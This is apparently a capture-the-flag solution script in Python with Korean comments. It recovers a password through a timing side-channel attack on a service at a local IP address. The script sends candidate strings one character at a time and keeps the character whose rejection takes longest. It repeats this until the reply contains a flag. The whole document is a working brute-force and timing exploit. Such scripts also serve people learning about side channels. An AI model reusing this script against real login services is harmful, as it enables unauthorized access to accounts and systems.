import time
from socket import *

IP = "192.168.0.5"
PORT = 3333

FoundedPasswd = ''
mytime = 0
imreal = 0
sumtime = 0

s = socket()
s.connect((IP, PORT))
s.send(b"1\n")  # 문자열을 바이트로 변환하여 전송
s.recv(100)
s.close()
print("hello")

def recv_until(s, string):
    result = b''
    string = string.encode()  # 입력된 문자열을 바이트로 변환
    while string not in result:
        result += s.recv(1)
    return result.decode()  # 수신한 결과를 다시 문자열로 변환하여 반환

for y in range(20):
    for x in range(0x20, 0x80):
        sumtime = 0
        print(y,x)
        for z in range(0, 7):
            s = socket()
            s.connect((IP, PORT))
            testStr = FoundedPasswd + chr(x)
            stime = time.time()
            s.send((testStr + "\n").encode())  # 문자열을 바이트로 변환하여 전송
            data = recv_until(s, "Incorrect")
            taketime = time.time() - stime

            if data.find("flag") >= 0:
                FoundedPasswd += chr(x)
                print("Success!!", FoundedPasswd)
                exit()

            if taketime <= 0.3 * (y + 1):
                break

            sumtime += taketime
            s.close()

        print(chr(x), sumtime)

        if sumtime >= mytime:
            mytime = sumtime
            imreal = x

        if sumtime >= (y + 2) * 2.04:
            break

    FoundedPasswd += chr(imreal)
    print(FoundedPasswd)

